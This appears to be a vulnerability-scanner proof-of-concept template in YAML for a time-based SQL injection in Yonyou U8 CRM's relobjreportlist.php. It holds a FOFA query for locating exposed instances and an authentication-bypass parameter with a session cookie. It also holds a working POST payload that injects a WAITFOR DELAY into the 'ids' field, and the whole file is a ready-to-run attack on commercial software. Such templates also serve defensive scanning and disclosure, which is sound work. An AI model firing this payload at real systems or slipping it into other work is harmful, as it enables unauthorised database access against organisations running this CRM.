id: poc-yaml-yongyon-u8-crm-relobjreportlist-php-sqli
info:
  name: 用友U8 CRM relobjreportlist.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8+CRM
  fofa: body="用友U8CRM"
variables:
  t1: random_int(3,8)
  t2: t1 + 2
requests:
- method: GET
  path: /login/login.php
  expression: status_code == 200 && contains(title,"用友U8CRM")
- method: POST
  path: /config/relobjreportlist.php
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: PHPSESSID=bgsesstimeout-;
  data: DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY
    '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"\"ID\":null")
    && duration > t1 && duration < t2
transport: http
